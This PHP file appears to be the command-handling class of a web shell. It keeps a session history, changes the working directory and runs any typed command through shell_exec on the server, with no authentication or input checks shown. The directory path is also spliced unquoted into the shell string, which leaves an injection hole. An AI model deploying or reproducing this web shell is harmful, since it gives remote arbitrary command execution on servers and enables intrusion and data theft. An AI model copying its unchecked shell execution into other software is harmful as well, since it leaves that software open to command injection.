<?php
namespace ishibashiTokyo;

class Commands
{
    public function Cmd_clear()
    {
        $_SESSION['webshell'] = [];

        header("Location: " . $_SERVER['PHP_SELF']);
    }

    public function Cmd_cd($cmd)
    {
        $_SESSION['webshell']['history'] .= sprintf(
            '[%s@%s %s] $ %s<br>' . PHP_EOL,
            $_SESSION['webshell']['sys_user'],
            $_SERVER['SERVER_ADDR'],
            $_SESSION['webshell']['path'],
            $cmd
        );
        $cmd_array = explode(' ', $cmd);

        // 引数なしの場合はカレントディレクトリをリセット
        if (! isset($cmd_array[1])) {
            $_SESSION['webshell']['path'] = realpath('./');
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        }

        // '/'始まりのパスはそのまま格納
        if (substr($cmd_array[1], 0, 1) === '/') {
            $_SESSION['webshell']['path'] = realpath($cmd_array[1]);
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        }

        $_SESSION['webshell']['path'] = realpath($_SESSION['webshell']['path'] . '/' . $cmd_array[1]);
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

    public function Cmd_exec($cmd)
    {
        $_SESSION['webshell']['history'] .= sprintf(
            '[%s@%s %s] $ %s<br>' . PHP_EOL,
            $_SESSION['webshell']['sys_user'],
            $_SERVER['SERVER_ADDR'],
            $_SESSION['webshell']['path'],
            $cmd
        );

        $exec_cmd = sprintf('cd %s ; %s', $_SESSION['webshell']['path'], $cmd);
        $_resulet = mb_convert_encoding(shell_exec($exec_cmd), 'UTF-8');

        $_SESSION['webshell']['history']
            .= sprintf(
                '<pre>%s</pre>' . PHP_EOL,
                htmlspecialchars($_resulet, ENT_QUOTES, 'UTF-8', true)
            );
    }
}